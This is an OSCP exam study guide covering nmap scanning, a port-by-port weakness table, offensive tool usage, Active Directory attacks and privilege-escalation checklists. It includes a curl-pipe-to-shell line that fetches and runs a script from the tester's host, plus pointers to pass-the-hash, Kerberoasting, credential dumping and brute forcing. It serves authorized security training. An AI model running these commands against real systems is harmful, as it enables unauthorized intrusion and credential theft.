# OSCP Methodology — Master Guide

> **Scope & Authorization**
> This guide is for authorized lab environments only: Hack The Box (retired machines), OSCP exam labs, PWK, and systems you own or are explicitly contracted to test. Never run these techniques against systems without written authorization.

---

## Table of Contents

1. [Enumeration Workflow](#enumeration-workflow)
2. [Nmap Section](#nmap-section)
3. [Port Reference Guide](#port-reference-guide)
4. [Tool Notes](#tool-notes)
5. [Privilege Escalation Methodology](#privilege-escalation-methodology)
6. [Exam Checklist](#exam-checklist)

---

## Enumeration Workflow

> **Golden rule:** Enumeration is ~80% of the work. If you're stuck, you have not enumerated enough. Re-enumerate with the context you now have.

### 1. Information Gathering

| Step | Action | Notes |
|------|--------|-------|
| Set target variable | `export IP=10.10.10.3` | Saves typing, reduces copy errors |
| Create working dir | `mkdir -p ~/htb/<box>/{scans,loot,exploit,www}` | Keep artifacts organized |
| Ping / TTL check | `ping -c1 $IP` | TTL ~64 = Linux, ~128 = Windows, ~255 = network device |
| Full notes file | Keep a running `.md` per box | Timestamp every finding |

### 2. Service Enumeration

1. Fast full-port TCP sweep to find *all* open ports.
2. Targeted version/script scan on the discovered ports.
3. UDP scan on common ports (don't skip — SNMP/TFTP/DNS live here).
4. For **every** open port: identify service, version, and known CVEs.

### 3. Web Enumeration

| Task | Tool / Command |
|------|----------------|
| Tech fingerprint | `whatweb http://$IP`, Wappalyzer |
| Directory brute | `feroxbuster -u http://$IP -w /usr/share/wordlists/dirb/common.txt` |
| Vhost/subdomain | `ffuf -w wordlist -H "Host: FUZZ.$DOMAIN" -u http://$IP` |
| Source review | View source, JS files, comments, `/robots.txt`, `/sitemap.xml` |
| Default creds | admin panels, CMS logins |
| Known CMS | `wpscan`, `droopescan`, `joomscan` |

### 4. SMB Enumeration

```bash
nmap --script "smb-enum*,smb-vuln*,smb-os-discovery" -p139,445 $IP
enum4linux -a $IP
smbclient -L //$IP/ -N          # null session
smbmap -H $IP                   # share permissions
crackmapexec smb $IP            # OS / domain / signing
```

### 5. Active Directory Enumeration

| Phase | Tooling |
|-------|---------|
| Unauth recon | `crackmapexec smb $IP`, `rpcclient -U "" $IP` |
| User enumeration | `kerbrute userenum`, `lookupsid.py`, RID cycling |
| Authenticated | `bloodhound-python`, `ldapdomaindump` |
| Kerberos | AS-REP roasting (`GetNPUsers.py`), Kerberoasting (`GetUserSPNs.py`) |
| Lateral | `psexec.py`, `wmiexec.py`, pass-the-hash |

### 6. Linux Enumeration (post-shell)

- `id`, `whoami`, `sudo -l`, `hostname`, `uname -a`
- SUID/SGID binaries, cron jobs, writable paths, capabilities
- Run `linpeas.sh`; cross-reference with GTFOBins
- Config files, history, SSH keys, readable `/etc/passwd` world-writable issues

### 7. Windows Enumeration (post-shell)

- `whoami /priv`, `whoami /all`, `systeminfo`
- Unquoted service paths, weak service perms, AlwaysInstallElevated
- `winpeas.exe`; cross-reference with LOLBAS
- Stored creds, scheduled tasks, registry autoruns

### 8. Privilege Escalation Methodology

See the [dedicated section](#privilege-escalation-methodology).

### 9. Post-Enumeration Notes

- Capture proof (`user.txt`, `root.txt`/`proof.txt`) and note the method.
- Document every command that worked **and** every dead end.
- Save credentials/hashes to a loot file for lateral movement.

---

## Nmap Section

> For each technique: **Purpose → Syntax → Example → Output meaning → When to use → Common mistakes.**

### Host Discovery

- **Purpose:** Find live hosts before port scanning.
- **Syntax:** `nmap -sn <range>`
- **Example:** `nmap -sn 10.10.10.0/24`
- **Output:** Lists hosts that respond to ping/ARP.
- **When:** Scoping a subnet.
- **Common mistake:** In HTB/OSCP, hosts often block ICMP — use `-Pn` to skip host discovery when a known IP "appears down."

### TCP Full-Port Scan

- **Purpose:** Discover every open TCP port (not just top 1000).
- **Syntax:** `nmap -p- --min-rate <n> -Pn <IP>`
- **Example:** `nmap -p- --min-rate 10000 -Pn -oN scans/allports.txt $IP`
- **Output:** `PORT STATE SERVICE` lines; `open` is what matters.
- **When:** Always, first.
- **Common mistake:** Forgetting `-p-` and missing high ports (e.g. services on 8080, 3632).

### Version Detection + Default Scripts

- **Purpose:** Identify service versions and run safe NSE scripts.
- **Syntax:** `nmap -sC -sV -p<ports> <IP>`
- **Example:** `nmap -sC -sV -p21,22,139,445 -oN scans/targeted.txt $IP`
- **Output:** Banner versions, script results (e.g. `smb-os-discovery`).
- **When:** After the full-port sweep, on discovered ports only.
- **Common mistake:** Running `-sV` on all 65535 ports first — slow. Discover first, then version-scan.

### UDP Scan

- **Purpose:** Find UDP services (SNMP, TFTP, DNS, NTP).
- **Syntax:** `nmap -sU --top-ports 20 <IP>`
- **Example:** `sudo nmap -sU --top-ports 50 -oN scans/udp.txt $IP`
- **Output:** `open|filtered` is common (UDP is ambiguous).
- **When:** Early, in parallel with TCP.
- **Common mistake:** UDP scans are slow; limit ports and be patient.

### OS Detection

- **Syntax:** `nmap -O <IP>`  (needs root)
- **When:** To confirm Linux vs Windows; corroborate with TTL.

### Aggressive Scan

- **Syntax:** `nmap -A <IP>` (= `-sC -sV -O --traceroute`)
- **When:** Quick one-shot; noisy, avoid if stealth matters.

### NSE Scripts

```bash
nmap --script vuln -p<ports> $IP          # known-vuln checks
nmap --script "smb-vuln*" -p445 $IP       # category/wildcard
ls /usr/share/nmap/scripts/ | grep smb    # browse scripts
```

### Performance Tuning

| Flag | Effect |
|------|--------|
| `-T4` | Faster timing (safe on labs) |
| `--min-rate 10000` | Force packet rate (fast full-port) |
| `-Pn` | Skip host discovery (ICMP blocked) |
| `-n` | Skip DNS resolution |
| `--open` | Show only open ports |

**Recommended OSCP two-step:**
```bash
nmap -p- --min-rate 10000 -Pn -n --open -oN scans/all.txt $IP
nmap -sC -sV -p<comma,separated,open,ports> -oN scans/detail.txt $IP
```

---

## Port Reference Guide

| Port | Proto | Service | Typical Software | Enumeration | Useful NSE | Common Weakness | Testing Notes |
|------|-------|---------|------------------|-------------|------------|-----------------|---------------|
| 21 | TCP | FTP | vsftpd, ProFTPD | `ftp $IP`, `nmap --script ftp-*` | `ftp-anon`, `ftp-vsftpd-backdoor` | Anon login, cleartext, backdoored versions | Try `anonymous`/blank; check write access |
| 22 | TCP | SSH | OpenSSH | `ssh -v`, banner grab | `ssh2-enum-algos`, `ssh-auth-methods` | Weak creds, old versions, key reuse | Rarely the entry; often used *after* finding creds |
| 23 | TCP | Telnet | telnetd | `telnet $IP` | `telnet-encryption` | Cleartext creds, default logins | Capture creds on the wire |
| 25 | TCP | SMTP | Postfix, Exim, Sendmail | `nc $IP 25`, `smtp-user-enum` | `smtp-enum-users`, `smtp-commands` | User enum (VRFY/EXPN), open relay | `VRFY root` to enumerate users |
| 53 | TCP/UDP | DNS | BIND | `dig`, `nslookup` | `dns-zone-transfer` | Zone transfer (AXFR), info leak | `dig axfr @$IP domain` |
| 69 | UDP | TFTP | tftpd | `tftp $IP` | `tftp-enum` | No auth, file read/write | Grab configs |
| 80 | TCP | HTTP | Apache, nginx, IIS | `whatweb`, `feroxbuster` | `http-enum`, `http-title` | Web app flaws, default pages | Primary attack surface — dig deep |
| 88 | TCP | Kerberos | AD KDC | `GetNPUsers.py`, `kerbrute` | `krb5-enum-users` | AS-REP roast, Kerberoast | Indicates a Domain Controller |
| 110 | TCP | POP3 | Dovecot | `nc $IP 110` | `pop3-capabilities` | Cleartext creds | Read mail after creds found |
| 111 | TCP/UDP | RPCbind | portmapper | `rpcinfo -p $IP` | `rpcinfo`, `nfs-*` | Exposes NFS/other RPC services | Often precedes NFS (2049) |
| 123 | UDP | NTP | ntpd | `ntpq -p` | `ntp-info` | Info leak, amplification | Low priority on OSCP |
| 135 | TCP | MSRPC | Windows RPC | `rpcdump.py`, `impacket` | `msrpc-enum` | DCOM/endpoint mapper abuse | Pairs with 139/445 |
| 137-138 | UDP | NetBIOS | Windows | `nmblookup -A $IP` | `nbstat` | Name/info leak | Legacy Windows discovery |
| 139 | TCP | NetBIOS-SSN | Samba/Windows | `enum4linux`, `smbclient` | `smb-os-discovery` | Null sessions, old Samba CVEs | See HTB Lame |
| 143 | TCP | IMAP | Dovecot | `nc $IP 143` | `imap-capabilities` | Cleartext creds | Read mail post-auth |
| 161 | UDP | SNMP | snmpd | `snmpwalk -c public -v2c $IP` | `snmp-*` | Default community `public`, info dump | Enumerate users/processes/software |
| 389 | TCP | LDAP | AD / OpenLDAP | `ldapsearch -x -H ldap://$IP` | `ldap-search`, `ldap-rootdse` | Anonymous bind, info leak | DC indicator; dump naming contexts |
| 443 | TCP | HTTPS | Apache, nginx, IIS | `sslscan`, `feroxbuster -k` | `ssl-cert`, `http-enum` | Same as 80 + cert/TLS issues | Check cert for hostnames |
| 445 | TCP | SMB | Samba/Windows | `smbclient`, `smbmap`, `cme` | `smb-vuln-ms17-010` | EternalBlue, null session, bad shares | See HTB Legacy |
| 464 | TCP | Kpasswd | AD | — | — | Kerberos password change | DC indicator |
| 512-514 | TCP | r-services | rsh/rlogin/rexec | `rlogin`, `rsh` | `rexec`, `rlogin` | Trust-based auth, no password | Legacy Unix |
| 873 | TCP | rsync | rsyncd | `rsync rsync://$IP/` | `rsync-list-modules` | Anon module access | List & pull modules |
| 993 | TCP | IMAPS | Dovecot | `openssl s_client` | `ssl-cert` | Cleartext-over-TLS misconfig | — |
| 995 | TCP | POP3S | Dovecot | `openssl s_client` | `ssl-cert` | — | — |
| 1433 | TCP | MSSQL | SQL Server | `mssqlclient.py`, `sqsh` | `ms-sql-info`, `ms-sql-xp-cmdshell` | `sa` weak creds, `xp_cmdshell` | Command exec via xp_cmdshell |
| 1521 | TCP | Oracle | Oracle DB | `odat`, `tnscmd10g` | `oracle-sid-brute` | SID brute, default creds | Use ODAT toolkit |
| 2049 | TCP | NFS | nfsd | `showmount -e $IP` | `nfs-ls`, `nfs-showmount` | no_root_squash, exported shares | Mount & read/write |
| 2375 | TCP | Docker API | dockerd | `docker -H $IP:2375 ps` | — | Unauth API = host takeover | Spawn privileged container |
| 3306 | TCP | MySQL | MySQL/MariaDB | `mysql -h $IP -u root` | `mysql-empty-password` | Empty/weak root, UDF | Read data, UDF privesc |
| 3389 | TCP | RDP | Windows RDP | `xfreerdp`, `rdesktop` | `rdp-ntlm-info` | BlueKeep, weak creds | Access after creds found |
| 5432 | TCP | PostgreSQL | postgres | `psql -h $IP -U postgres` | `pgsql-brute` | Weak creds, COPY RCE | — |
| 5601 | TCP | Kibana | Elastic Kibana | browser | — | Old-version RCE, info leak | Check version CVEs |
| 5985 | TCP | WinRM (HTTP) | Windows | `evil-winrm` | `http-title` | Remote shell with creds | Primary Windows foothold-after-creds |
| 5986 | TCP | WinRM (HTTPS) | Windows | `evil-winrm -S` | — | Same as 5985 over TLS | — |
| 6379 | TCP | Redis | redis-server | `redis-cli -h $IP` | `redis-info` | No auth, write SSH keys/webshell | Unauth = RCE often |
| 8080 | TCP | HTTP-alt | Tomcat, Jenkins | `feroxbuster`, browser | `http-enum` | Tomcat manager default creds, Jenkins | `/manager/html`, deploy WAR |
| 8443 | TCP | HTTPS-alt | Tomcat, mgmt UIs | `feroxbuster -k` | `ssl-cert` | Same as 8080 over TLS | — |
| 9200 | TCP | Elasticsearch | Elastic | `curl $IP:9200` | — | Unauth data, old-version RCE | `/_cat/indices` |
| 11211 | TCP | Memcached | memcached | `nc $IP 11211` → `stats` | `memcached-info` | Unauth data, amplification | Dump cached secrets |

---

## Tool Notes

> For each: **Overview → Install → Common commands → Practical usage → Output interpretation → OSCP tips.**

### Nmap
- **Overview:** Port/service/vuln scanner; the backbone of recon.
- **Install:** `sudo apt install nmap` (pre-installed on Kali).
- **Common:** `nmap -p- --min-rate 10000 -Pn $IP`, `nmap -sC -sV -p<ports> $IP`, `nmap --script vuln $IP`.
- **Interpretation:** Focus on `open` ports + version strings; feed versions into searchsploit.
- **OSCP tip:** Keep scans to `-oN`/`-oA` files; the exam wants reproducible evidence.

### Metasploit (MSF)
- **Overview:** Exploitation framework. **OSCP limits its use to one machine** — know the manual method too.
- **Install:** `sudo apt install metasploit-framework`; init DB `msfdb init`.
- **Common:** `msfconsole`, `search <cve>`, `use <module>`, `set RHOSTS`, `set LHOST`, `run`, `sessions`.
- **Practical:** `search ms17-010` → `use exploit/windows/smb/ms17_010_psexec`.
- **Interpretation:** "Meterpreter session opened" = shell. `getuid` for context.
- **OSCP tip:** Budget your single MSF use carefully; practice `-j` backgrounding and multi/handler.

### Gobuster
- **Overview:** Fast directory/DNS/vhost brute-forcer.
- **Install:** `sudo apt install gobuster`.
- **Common:** `gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html`.
- **OSCP tip:** Add `-x` extensions matching the detected stack.

### Feroxbuster
- **Overview:** Recursive content discovery (Rust, very fast).
- **Install:** `sudo apt install feroxbuster`.
- **Common:** `feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt`.
- **OSCP tip:** Recursion finds nested dirs automatically; watch status codes (200/301/403).

### Enum4linux
- **Overview:** Wraps smbclient/rpcclient/nmblookup for SMB enumeration.
- **Install:** pre-installed; `enum4linux-ng` is the modern rewrite.
- **Common:** `enum4linux -a $IP`.
- **Interpretation:** Shares, users, OS, workgroup, password policy.
- **OSCP tip:** Great first SMB pass; note the Samba/Windows version for CVE lookup.

### SMBMap
- **Overview:** Enumerate SMB share permissions and browse/transfer.
- **Common:** `smbmap -H $IP`, `smbmap -H $IP -u user -p pass`, `smbmap -H $IP -R share`.
- **OSCP tip:** Shows READ/WRITE at a glance — faster than smbclient for triage.

### CrackMapExec (CME / NetExec)
- **Overview:** Swiss-army knife for SMB/WinRM/LDAP across hosts.
- **Common:** `crackmapexec smb $IP`, `cme smb $IP -u user -p pass --shares`, `cme smb $IP -u user -H <hash>`.
- **OSCP tip:** `(Pwn3d!)` means admin — try `--sam`/`--lsa`. NetExec (`nxc`) is the maintained fork.

### BloodHound
- **Overview:** Graphs AD attack paths.
- **Install:** `pip install bloodhound`; GUI needs neo4j.
- **Common:** `bloodhound-python -u user -p pass -d domain -c all -ns $IP`.
- **OSCP tip:** Useful for AD sets; look for "Shortest path to Domain Admins."

### Evil-WinRM
- **Overview:** WinRM shell (ports 5985/5986).
- **Install:** `gem install evil-winrm`.
- **Common:** `evil-winrm -i $IP -u user -p pass`, `-H <hash>` for PtH.
- **OSCP tip:** Built-in `upload`/`download`; the go-to foothold once you have Windows creds.

### LinPEAS
- **Overview:** Linux privesc enumeration script.
- **Common:** host it (`python3 -m http.server`), `curl http://<you>/linpeas.sh | sh`.
- **Interpretation:** Red/yellow highlights = high-interest findings.
- **OSCP tip:** Don't trust blindly — verify each lead manually (SUID, sudo, cron).

### WinPEAS
- **Overview:** Windows equivalent of LinPEAS.
- **Common:** upload `winPEASx64.exe`, run it.
- **OSCP tip:** Pair output with LOLBAS for exploitation paths.

### Netcat
- **Overview:** TCP/UDP read/write; banner grab, listener, shells, transfer.
- **Common:** `nc -lvnp 4444` (listener), `nc $IP 80` (banner), `nc -w3 $IP 21`.
- **OSCP tip:** Learn the reverse/bind shell one-liners; `rlwrap nc` for a nicer shell.

### Hydra
- **Overview:** Online password brute-forcer.
- **Common:** `hydra -l user -P rockyou.txt ssh://$IP`, `hydra -L users -P pass $IP http-post-form "..."`.
- **OSCP tip:** Use sparingly — lockouts/noise. Prefer known creds first.

### Burp Suite
- **Overview:** Web proxy for intercept/repeat/intruder.
- **Common:** Proxy → intercept, Repeater for manual testing, Intruder (slow in Community).
- **OSCP tip:** Repeater is your best friend for manual web exploitation; match/replace for tokens.

---

## Privilege Escalation Methodology

### Linux

| Vector | Check | Exploit idea |
|--------|-------|--------------|
| sudo rights | `sudo -l` | GTFOBins for allowed binaries |
| SUID/SGID | `find / -perm -4000 2>/dev/null` | GTFOBins SUID entries |
| Capabilities | `getcap -r / 2>/dev/null` | `cap_setuid` on python/perl |
| Cron jobs | `cat /etc/crontab`, `ls -la /etc/cron.*` | Writable script run as root |
| Writable PATH | inspect scripts | Hijack relative binary |
| Kernel | `uname -r` + searchsploit | Dirty COW / overlayfs (last resort) |
| Services/creds | config files, history, `.ssh` | Reuse credentials |
| NFS | `cat /etc/exports` | `no_root_squash` SUID planting |

### Windows

| Vector | Check | Exploit idea |
|--------|-------|--------------|
| Privileges | `whoami /priv` | SeImpersonate → Potato attacks |
| Services | `accesschk`, unquoted paths | Replace binary / weak perms |
| AlwaysInstallElevated | registry keys | Malicious MSI |
| Stored creds | `cmdkey /list`, registry, Unattend.xml | Reuse/runas |
| Scheduled tasks | `schtasks /query` | Writable task binary |
| Kernel/missing patch | `systeminfo` + Watson/WES-NG | Local exploit (e.g. MS16-* on legacy) |
| Token/hash | mimikatz, SAM | Pass-the-hash to admin |

---

## Exam Checklist

### Pre-engagement
- [ ] VPN connected, target reachable (`ping`/`-Pn`)
- [ ] Note-taking tool ready; screenshots capturing proof + IP
- [ ] Working directory per target

### Per target
- [ ] Full TCP port scan (`-p-`)
- [ ] Targeted `-sC -sV` on open ports
- [ ] UDP top ports
- [ ] Enumerate **every** service (no skipping)
- [ ] searchsploit each version
- [ ] Web: dirbuster + source + known CMS
- [ ] SMB: enum4linux + null session + shares
- [ ] Capture foothold → `user.txt` (screenshot with `id`/`whoami` + IP)
- [ ] Local enum (linpeas/winpeas) + manual verification
- [ ] Privesc → `root.txt`/`proof.txt` (screenshot with `id`/`whoami` + IP)

### Reporting
- [ ] Every step reproducible with exact commands
- [ ] All proofs + required `ipconfig`/`ifconfig` screenshots
- [ ] Note dead ends (shows methodology)

> **Time management:** If stuck >45–60 min on one box, rotate. Fresh eyes + re-enumeration beats tunnel vision.
